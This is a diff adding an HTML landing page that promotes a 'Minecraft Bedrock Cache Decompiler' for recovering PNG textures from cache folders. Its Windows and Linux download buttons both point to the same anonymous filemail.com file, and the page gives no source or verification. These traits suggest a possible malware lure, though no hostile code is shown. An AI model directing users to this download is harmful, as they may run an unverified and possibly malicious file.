@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Minecraft Bedrock Cache Decompiler</title>
+  <style>
+    :root {
+      --bg: #0b0f14;
+      --panel: #121826;
+      --accent: #4ade80;
+      --accent-glow: rgba(74, 222, 128, 0.4);
+      --text: #e5e7eb;
+      --muted: #9ca3af;
+    }
+
+    * {
+      box-sizing: border-box;
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    body {
+      margin: 0;
+      background: radial-gradient(1200px 600px at top, #111827, var(--bg));
+      color: var(--text);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 40px;
+    }
+
+    .container {
+      max-width: 900px;
+      width: 100%;
+      background: linear-gradient(180deg, #121826, #0f1420);
+      border-radius: 16px;
+      box-shadow: 0 0 40px rgba(0, 0, 0, 0.6);
+      padding: 40px;
+      border: 1px solid rgba(255, 255, 255, 0.05);
+    }
+
+    h1 {
+      margin-top: 0;
+      font-size: 2.6rem;
+      letter-spacing: 0.5px;
+      text-shadow: 0 0 20px var(--accent-glow);
+    }
+
+    .tagline {
+      color: var(--accent);
+      font-weight: 600;
+      margin-bottom: 10px;
+    }
+
+    .meta {
+      font-size: 0.9rem;
+      color: var(--muted);
+      margin-bottom: 30px;
+    }
+
+    .download {
+      display: inline-block;
+      padding: 16px 28px;
+      background: linear-gradient(135deg, #22c55e, #4ade80);
+      color: #052e16;
+      text-decoration: none;
+      font-weight: 700;
+      border-radius: 12px;
+      box-shadow: 0 0 25px var(--accent-glow);
+      transition: transform 0.15s ease, box-shadow 0.15s ease;
+      margin-bottom: 30px;
+    }
+
+    .download:hover {
+      transform: translateY(-2px) scale(1.02);
+      box-shadow: 0 0 40px var(--accent-glow);
+    }
+
+    .content {
+      line-height: 1.8;
+      font-size: 1.05rem;
+      color: #d1d5db;
+    }
+
+    .content p {
+      margin-bottom: 20px;
+    }
+
+    .highlight {
+      color: var(--accent);
+      font-weight: 600;
+    }
+
+    footer {
+      margin-top: 40px;
+      padding-top: 20px;
+      border-top: 1px solid rgba(255, 255, 255, 0.06);
+      color: var(--muted);
+      font-size: 0.85rem;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="tagline">Advanced Cache Tool for Modders & Addon Creators</div>
+    <h1>Minecraft Bedrock Cache Decompiler</h1>
+    <div class="meta">File uploaded on 11-21-2025 • Bedrock Edition compatible</div>
+
+    <a class="download" href="https://3005.filemail.com/api/file/get?filekey=YUzLLqfEMRybzygxnHj7j0yPaGEh9wFaSJ8l2HwiTS0MmIu8_PqZQQ02tbCTLpXn1P_cGn5N&pk_vid=f934e6ba3d53975f17681434671ef32b" target="_blank">Download for Windows</a>
+    <a class="download" href="https://3005.filemail.com/api/file/get?filekey=YUzLLqfEMRybzygxnHj7j0yPaGEh9wFaSJ8l2HwiTS0MmIu8_PqZQQ02tbCTLpXn1P_cGn5N&pk_vid=f934e6ba3d53975f17681434671ef32b" target="_blank">Download for Linux</a>
+
+    <div class="content">
+      <p>
+        The <span class="highlight">Minecraft Bedrock Cache Decompiler</span> is a specialized utility designed to dive deep into
+        Minecraft Bedrock Edition's internal cache system and pull out usable, readable, and repairable assets. If you have ever
+        explored the <code>cache</code> or <code>cache_blob</code> folders and found a chaotic mess of hashed filenames, broken images,
+        and half-loaded textures, this tool exists for you.
+      </p>
+
+      <p>
+        Minecraft Bedrock stores many addon and resource assets in a cached binary format for performance reasons. While this makes
+        the game faster, it makes life harder for developers and curious users. PNG files inside the cache can become fragmented,
+        partially corrupted, or stripped of proper headers. This decompiler works by scanning cache entries, identifying embedded
+        PNG signatures, reconstructing missing headers, and exporting clean, repaired image files that can be opened in any image
+        editor.
+      </p>
+
+      <p>
+        Under the hood, the decompiler analyzes binary cache blocks, searches for known image markers, and reconstructs texture data
+        using intelligent heuristics. Even when filenames are lost, the tool can still recover textures by structure alone. This
+        makes it extremely useful for recovering addon icons, GUI textures, particle sprites, and other visual assets from cached
+        Minecraft Bedrock addons.
+      </p>
+
+      <p>
+        Unlike basic cache viewers, this tool focuses on <span class="highlight">decompiling and repairing</span>. That means it does not
+        simply dump raw data—it actively fixes broken PNGs, validates chunk ordering, restores transparency, and ensures the output
+        files match standard PNG specifications. The result is a clean folder of usable images instead of a pile of corrupted junk.
+      </p>
+
+      <p>
+        Whether you are a modder trying to recover lost textures, a developer reverse-engineering addon behavior, or just someone
+        curious about how Minecraft Bedrock manages its cached resources, this tool gives you a clear window into the process. It
+        turns Minecraft's opaque cache system into something understandable, editable, and useful.
+      </p>
+
+      <p>
+        In short: this decompiler takes messy Bedrock cache data, intelligently breaks it apart, repairs what Minecraft left broken,
+        and hands you back proper PNG files ready to be viewed, edited, or reused. Simple on the outside, powerful on the inside.
+      </p>
+    </div>
+
+    <footer>
+      Not affiliated with Mojang or Microsoft. Minecraft is a trademark of Mojang Studios.
+    </footer>
+  </div>
+</body>
+
+</html>
